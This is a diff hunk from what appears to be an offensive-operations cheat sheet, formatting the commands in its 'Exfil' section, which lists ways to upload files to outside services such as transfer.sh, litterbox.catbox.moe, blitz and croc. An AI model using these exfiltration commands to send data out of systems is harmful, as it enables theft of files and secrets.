@@ -1383,12 +1383,12 @@ Tunneling
 1. [ngrok](https://ngrok.com/download), [cloudflared](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps) or [pagekite](https://pagekite.net/) to make a server behind NAT accessible from the public Internet.
 
 Exfil
-1. [Blitz](https://github.com/hackerschoice/gsocket#blitz) - blitz -l / blitz foo.txt
+1. [Blitz](https://github.com/hackerschoice/gsocket#blitz) - `blitz -l / blitz foo.txt`
 1. [Mega](https://mega.io/cmd)
 1. ~~[BashUpload](https://bashupload.com/)~~
-2. [Transfer.sh](https://transfer.sh/) - curl --upload-file foo.txt https://transfer.sh
-3. [LitterBox](https://litterbox.catbox.moe/tools.php) - curl -F reqtype=fileupload -F time=72h -F 'fileToUpload=@foo.txt' https://litterbox.catbox.moe/resources/internals/api.php
-4. [Croc](https://github.com/schollz/croc) - croc send foo.txt / croc anit-price-example
+2. [Transfer.sh](https://transfer.sh/) - `curl --upload-file foo.txt https://transfer.sh`
+3. [LitterBox](https://litterbox.catbox.moe/tools.php) - `curl -F reqtype=fileupload -F time=72h -F 'fileToUpload=@foo.txt' https://litterbox.catbox.moe/resources/internals/api.php`  
+4. [Croc](https://github.com/schollz/croc) - `croc send foo.txt / croc anit-price-example`
 6. [MagicWormhole](https://pypi.org/project/magic-wormhole/)
 
 Publishing
